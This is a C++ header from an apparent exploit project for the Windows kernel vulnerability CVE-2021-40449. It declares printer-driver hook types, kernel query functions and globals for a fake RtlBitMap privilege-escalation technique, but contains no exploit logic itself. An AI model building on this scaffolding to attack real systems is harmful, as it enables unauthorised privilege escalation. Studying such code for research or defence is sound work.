/*
 * @Date: 2026-11-03 15:41:55
 * @LastEditors: joe1sn joe1sn23333@gmail.com
 * @LastEditTime: 2026-11-03 15:42:37
 * @FilePath: \panicake\exp\CVE_2021_40449\def.hpp
 */
#pragma once
#include <windows.h>
#include <iostream>
#include <vector>
#include <winddi.h>
#include <winternl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include "include/common/memtools.hpp"
#include "include/common/gadget.hpp"
#define SystemHandleInformation         0x10
#define SystemBigPoolInformation        0x42
#define ThreadNameInformation           0x26
namespace CVE_2021_40449
{
    typedef struct
    {
        DWORD64 Address;
        DWORD64 PoolSize;
        CHAR PoolTag[4];
        CHAR Padding[4];
    } BIG_POOL_INFO, * PBIG_POOL_INFO;

    typedef BOOL(*DrvEnableDriver_t)(ULONG iEngineVersion, ULONG cj, DRVENABLEDATA* pded);
    typedef DHPDEV(*DrvEnablePDEV_t)(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);
    typedef VOID(*VoidFunc_t)();
    typedef NTSTATUS(*NtSetInformationThread_t)(HANDLE threadHandle, THREADINFOCLASS threadInformationClass, PVOID threadInformation, ULONG threadInformationLength);
    typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

    inline NtSetInformationThread_t SetInformationThread;
    inline NtQuerySystemInformation_t QuerySystemInformation;

    inline DWORD64 rtlSetAllBits, fakeRtlBitMapAddr;

    inline HMODULE kernelModule, ntdllModule;
    inline HANDLE hPrinter;
    inline LPWSTR printerName;
    inline DrvEnablePDEV_t oldFuncPtr;

    bool initAPI();
    bool findPrinters(DrvEnablePDEV_t hookfunc);
} // namespace CVE_2021_40449